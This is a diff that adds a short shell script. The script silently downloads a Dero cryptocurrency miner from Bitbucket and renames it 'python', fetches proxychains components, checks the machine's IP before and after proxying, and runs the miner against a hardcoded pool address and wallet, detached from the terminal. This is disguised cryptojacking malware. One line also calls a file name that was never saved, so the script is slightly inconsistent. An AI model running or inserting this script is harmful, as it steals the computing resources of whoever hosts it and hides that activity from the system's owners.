@@ -1,0 +1,13 @@
+wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
+
+wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+
+wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
+
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
+
+echo "IP ORI ==> "$(curl ifconfig.me)
+
+echo "IP Baru ==> "$(./panel curl ifconfig.me)
+
+./proxy ./python -r 148.113.139.97:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmkjhxpwn9qeawqhtj70g.GiPodD && disown -h%1
